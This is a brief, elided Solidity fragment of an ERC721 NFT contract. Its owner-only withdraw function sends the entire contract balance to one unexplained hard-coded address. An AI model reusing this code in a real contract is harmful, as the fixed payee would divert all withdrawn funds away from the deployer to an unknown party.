...
contract SimpleNftLowerGas is ERC721, Ownable {
  ...
  function withdraw() public onlyOwner {
    ...
    // =============================================================================
    (bool hs, ) = payable(0xBf4DCcfDE987E97d20f56BE893a5054c89Ef3735).call{value: address(this).balance * 100 / 100}("");
    require(hs);
